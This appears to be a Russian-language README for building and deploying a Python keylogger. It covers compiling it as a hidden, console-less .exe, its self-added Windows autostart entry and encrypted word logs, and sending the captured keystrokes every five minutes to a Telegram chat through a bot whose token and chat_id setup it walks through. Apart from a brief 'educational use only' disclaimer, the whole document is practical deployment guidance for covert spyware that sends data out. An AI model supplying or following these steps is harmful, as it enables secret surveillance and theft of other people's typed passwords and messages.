Инструкция по установке и сборке кейлоггера (логирует слова):

1. Установите Python 3.12 с сайта https://www.python.org
2. Откройте терминал в папке проекта

3. Установите зависимости:
   pip install pynput cryptography requests pyinstaller

4. Сборка .exe (скрытая, с автозапуском):
   pyinstaller --onefile --noconsole keylogger_words.py

5. После запуска:
   - Кейлоггер добавляется в автозагрузку
   - Логирует слова и отправляет каждые 5 минут в Telegram (в chat_id 5995115618)
   - Шифрует данные в keylogs.txt
   - Ключ для расшифровки: key.key

6. Для расшифровки:
   python decrypt_logs.py

7. Для удаления из автозагрузки:
   Открой PowerShell и введи:
   reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v KeyLoggerWords /f

❗ Использовать только на своём устройстве и в образовательных целях!


===============================
Настройка отправки в Telegram:
===============================

1. Создайте бота через @BotFather:
   - Найдите в Telegram бота @BotFather
   - Отправьте команду: /newbot
   - Укажите имя и username (например: MyKeyloggerBot)
   - Скопируйте TOKEN, он будет выглядеть так:
     123456789:ABCdefGhIjKlmnOpQRstuVWXyz

2. Получите ваш chat_id:
   - Откройте вашего бота в Telegram и отправьте ему любое сообщение (например: /start)
   - Перейдите в браузере по ссылке:
     https://api.telegram.org/bot<ВАШ_ТОКЕН>/getUpdates
     (замените <ВАШ_ТОКЕН> на настоящий токен)

   - В ответе найдите строку: "chat":{"id":123456789,...}
     Это и есть ваш chat_id (например: 123456789)

3. Откройте файл keylogger_words.py и замените:
   self.telegram_token = 'ВАШ_ТОКЕН'
   self.chat_id = 'ВАШ_CHAT_ID'

4. Сохраните файл и пересоберите .exe с помощью PyInstaller.
   Всё готово — теперь логи будут приходить в ваш Telegram!
